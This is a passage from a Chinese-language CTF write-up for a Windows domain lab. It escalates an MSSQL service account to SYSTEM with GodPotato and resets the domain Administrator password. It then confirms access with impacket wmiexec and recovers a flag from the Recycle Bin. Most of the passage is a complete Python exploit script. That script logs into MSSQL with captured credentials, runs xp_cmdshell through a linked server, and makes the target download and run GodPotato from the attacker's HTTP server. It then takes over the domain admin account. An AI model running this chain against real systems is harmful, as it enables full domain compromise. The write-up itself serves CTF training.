<font style="color:rgb(51, 51, 51);">由于系统是 Windows Server 2019，且 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc</font>`<font style="color:rgb(51, 51, 51);"> 拥有 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SeImpersonatePrivilege</font>`<font style="color:rgb(51, 51, 51);">，直接换成 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">GodPotato</font>`<font style="color:rgb(51, 51, 51);"> 即可。</font>

<font style="color:rgb(51, 51, 51);">我在宿主机开了一个临时 HTTP 服务，把 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">GodPotato-NET4.exe</font>`<font style="color:rgb(51, 51, 51);"> 投到客机，然后通过 SQL 执行：</font>

C:\Windows\Temp\GodPotato-NET4.exe -cmd "cmd /c net user Administrator Xmctf2026Aa /domain"

`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">GodPotato</font>`<font style="color:rgb(51, 51, 51);"> 的关键回显如下：</font>

```plain
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] Start Search System Token
[*] PID : 804 Token:0x800  User: NT AUTHORITY\SYSTEM
[*] Find System Token : True
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid ...
The command completed successfully.
```

<font style="color:rgb(51, 51, 51);">这说明链条已经把 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc</font>`<font style="color:rgb(51, 51, 51);"> 抬到了 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM</font>`<font style="color:rgb(51, 51, 51);">，并成功执行了我们给它的命令。</font>

<font style="color:rgb(51, 51, 51);">随后再查：</font>

net user Administrator /domain

<font style="color:rgb(51, 51, 51);">可以看到 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Password last set</font>`<font style="color:rgb(51, 51, 51);"> 已经更新，说明域管理员密码确实被改掉了。</font>

#### <font style="color:rgb(51, 51, 51);">验证 Administrator shell</font>
<font style="color:rgb(51, 51, 51);">最后直接用新密码通过 impacket 的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">wmiexec.py</font>`<font style="color:rgb(51, 51, 51);"> 验证远程管理员执行：</font>

```plain
python wmiexec.py XMCVE/Administrator:Xmctf2026Aa@169.254.212.20 whoami
python wmiexec.py XMCVE/Administrator:Xmctf2026Aa@169.254.212.20 hostname
```

<font style="color:rgb(51, 51, 51);">回显：</font>

```plain
xmcve\administrator
CASTLEVANIA
```

<font style="color:rgb(51, 51, 51);">这一步已经满足题目要求的：</font>

拿到 Administrator shell

#### <font style="color:rgb(51, 51, 51);">补充：本地 flag 文本的恢复</font>
<font style="color:rgb(51, 51, 51);">虽然官方 flag 要人工审核后发放，但镜像里其实残留了一个已经删除的本地 flag 文件线索。</font>

<font style="color:rgb(51, 51, 51);">在 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Alucard</font>`<font style="color:rgb(51, 51, 51);"> 的 Recent 里有一个快捷方式：</font>

C:\Users\Alucard\Recent\flag.lnk

<font style="color:rgb(51, 51, 51);">它指向：</font>

C:\Users\Administrator\Desktop\flag.txt

<font style="color:rgb(51, 51, 51);">这个文件本身已经被删掉了，但在回收站目录中仍然留有内容文件：</font>

$Recycle.Bin\S-1-5-21-...-500\$RIZ9PVX.txt

<font style="color:rgb(51, 51, 51);">离线读这个文件，能恢复出：</font>

FLAG{XMCVE_Castlevania_Bloodlines_DA_Pwned}

<font style="color:rgb(51, 51, 51);">再次强调，这更像是镜像内的本地证明文本，不一定等于比赛平台最后发放的正式 flag。</font>

#### <font style="color:rgb(51, 51, 51);">Exploit</font>
<font style="color:rgb(51, 51, 51);">完整利用脚本放在：</font>

```plain
from __future__ import annotations

import subprocess
import sys
import threading
from dataclasses import dataclass
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

from impacket import tds


TARGET_IP = "169.254.212.20"
HOST_HTTP_IP = "169.254.212.1"
HOST_HTTP_PORT = 8000

SQL_USER = "wuwupor"
SQL_PASS = "lovlyBaby"
NEW_ADMIN_PASS = "Xmctf2026Aa"


@dataclass
class HttpServerContext:
    server: ThreadingHTTPServer
    thread: threading.Thread

    def close(self) -> None:
        self.server.shutdown()
        self.server.server_close()
        self.thread.join(timeout=3)


class QuietHandler(SimpleHTTPRequestHandler):
    def log_message(self, format: str, *args) -> None:  # noqa: A003
        return


def start_http_server(directory: Path) -> HttpServerContext:
    handler = lambda *args, **kwargs: QuietHandler(*args, directory=str(directory), **kwargs)
    server = ThreadingHTTPServer((HOST_HTTP_IP, HOST_HTTP_PORT), handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return HttpServerContext(server=server, thread=thread)


def sql_connect() -> tds.MSSQL:
    mssql = tds.MSSQL(TARGET_IP, 1433)
    mssql.connect()
    ok = mssql.login(None, SQL_USER, SQL_PASS, None, None, useWindowsAuth=False)
    if not ok:
        raise RuntimeError("failed to log into MSSQL with recovered credentials")
    return mssql


def exec_via_public(mssql: tds.MSSQL, command: str) -> list[str]:
    sql = "exec ('exec master..xp_cmdshell ''%s''') at POO_PUBLIC" % command.replace("'", "''")
    mssql.sql_query(sql)
    return [row["output"] for row in getattr(mssql, "rows", []) if row.get("output") != "NULL"]


def verify_admin_shell() -> str:
    script = Path(sys.executable).parent / "Scripts" / "wmiexec.py"
    if not script.exists():
        script = Path(r"C:\Users\25478\AppData\Roaming\Python\Python314\Scripts\wmiexec.py")
    cmd = [
        sys.executable,
        str(script),
        f"XMCVE/Administrator:{NEW_ADMIN_PASS}@{TARGET_IP}",
        "whoami",
    ]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=120, check=True)
    return result.stdout


def main() -> int:
    base_dir = Path(__file__).resolve().parent
    godpotato = base_dir / "GodPotato-NET4.exe"
    if not godpotato.exists():
        raise FileNotFoundError(f"missing {godpotato}")

    http_ctx = start_http_server(base_dir)
    try:
        mssql = sql_connect()
        try:
            steps = [
                (
                    "download GodPotato",
                    f'powershell -nop -c "iwr -UseBasicParsing http://{HOST_HTTP_IP}:{HOST_HTTP_PORT}/{godpotato.name} '
                    f'-OutFile C:\\Windows\\Temp\\{godpotato.name}"',
                ),
                (
                    "reset Administrator password via SYSTEM",
                    f'C:\\Windows\\Temp\\{godpotato.name} -cmd "cmd /c net user Administrator {NEW_ADMIN_PASS} /domain"',
                ),
                ("show Administrator account", "net user Administrator /domain"),
            ]

            for title, command in steps:
                print(f"[+] {title}")
                for line in exec_via_public(mssql, command):
                    print(line)
                print()
        finally:
            mssql.disconnect()

        print("[+] verifying Administrator shell with wmiexec")
        print(verify_admin_shell())
        return 0
    finally:
        http_ctx.close()


if __name__ == "__main__":
    raise SystemExit(main())
```

<font style="color:rgb(51, 51, 51);">脚本做的事情是：</font>

1. <font style="color:rgb(51, 51, 51);">在宿主机开启临时 HTTP 服务。</font>
2. <font style="color:rgb(51, 51, 51);">用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">wuwupor / lovlyBaby</font>`<font style="color:rgb(51, 51, 51);"> 登录 MSSQL。</font>
3. <font style="color:rgb(51, 51, 51);">通过 linked server </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">POO_PUBLIC</font>`<font style="color:rgb(51, 51, 51);"> 执行 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">xp_cmdshell</font>`<font style="color:rgb(51, 51, 51);">。</font>
4. <font style="color:rgb(51, 51, 51);">向客机投递并运行 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">GodPotato-NET4.exe</font>`<font style="color:rgb(51, 51, 51);">。</font>
5. <font style="color:rgb(51, 51, 51);">把 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);"> 的域密码改成已知值。</font>
6. <font style="color:rgb(51, 51, 51);">调用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">wmiexec.py</font>`<font style="color:rgb(51, 51, 51);"> 验证 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);"> shell。</font>



